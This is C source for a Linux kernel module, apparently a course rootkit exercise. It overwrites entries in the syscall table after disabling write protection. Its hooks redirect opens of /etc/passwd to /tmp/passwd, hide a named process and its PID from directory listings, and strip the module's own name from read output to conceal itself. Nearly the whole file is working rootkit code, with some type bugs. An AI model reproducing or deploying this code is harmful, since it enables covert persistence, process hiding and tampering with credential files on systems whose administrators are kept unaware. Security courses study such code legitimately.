#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>


#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/uaccess.h>


#include <linux/slab.h>      // for kmalloc, kfree


#define PREFIX "sneaky_process"

// extern int sneaky_pid; 
static char* sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(sneaky_pid, "pid of sneaky module");
//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  char __user *user_path = (char *)regs->si;
  const char *target_path = "/etc/passwd";
  const char *redirect_path = "/tmp/passwd";
  char kpath[256];  // Kernel buffer to hold the path
  if (copy_from_user(kpath, user_path, sizeof(kpath)) == 0) {
    kpath[sizeof(kpath) - 1] = '\0';
    if (strcmp(kpath, target_path) == 0) {
      copy_to_user(user_path, redirect_path, strlen(redirect_path) + 1);
    }
  }
  return (*original_openat)(regs);
}


asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);

asmlinkage int sneaky_hide_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
    int nread = original_getdents64(fd, dirent, count);
    struct linux_dirent64 *d;
    char *dbuf;
    int bpos = 0;
    char pid_str[10];

    sprintf(pid_str, "%d", sneaky_pid);

    if (nread <= 0) 
        return nread;

    dbuf = (char *)kmalloc(nread, GFP_KERNEL);
    copy_from_user(dbuf, dirent, nread);

    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent64 *)(dbuf + bpos);
        if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid_str) == 0) {
            int reclen = d->d_reclen;
            memmove(d, (char *)d + reclen, nread - bpos - reclen);
            nread -= reclen;
        } else {
            bpos += d->d_reclen;
        }
    }

    copy_to_user(dirent, dbuf, nread);
    kfree(dbuf);
    return nread;
}

asmlinkage ssize_t (*original_read)(int fd, char __user *buf, size_t count);

asmlinkage ssize_t sneaky_sys_read(int fd, char __user *buf, size_t count) {
    ssize_t nread = original_read(fd, buf, count);
    char *start, *end;
    char *temp_buf;

    if (nread > 0) {
        temp_buf = kmalloc(nread + 1, GFP_KERNEL); // Allocate memory for temporary buffer
        if (!temp_buf)
            return nread;  // Proceed with original read data if allocation fails

        copy_from_user(temp_buf, buf, nread); // Copy data from user space
        temp_buf[nread] = '\0'; // Null-terminate the string

        start = strstr(temp_buf, "sneaky_mod"); // Find the start of "sneaky_mod" entry
        while (start) {
            end = strchr(start, '\n'); // Find the end of the line
            if (end) {
                end += 1; // Move past the newline character
                memmove(start, end, nread - (end - temp_buf)); // Remove the line
                nread -= (end - start);
                temp_buf[nread] = '\0'; // Update null-termination
            }
            start = strstr(start, "sneaky_mod"); // Check for any more occurrences
        }

        copy_to_user(buf, temp_buf, nread); // Copy modified data back to user space
        kfree(temp_buf); // Free the temporary buffer
    }

    return nread; // Return the modified number of bytes read
}







// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_hide_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");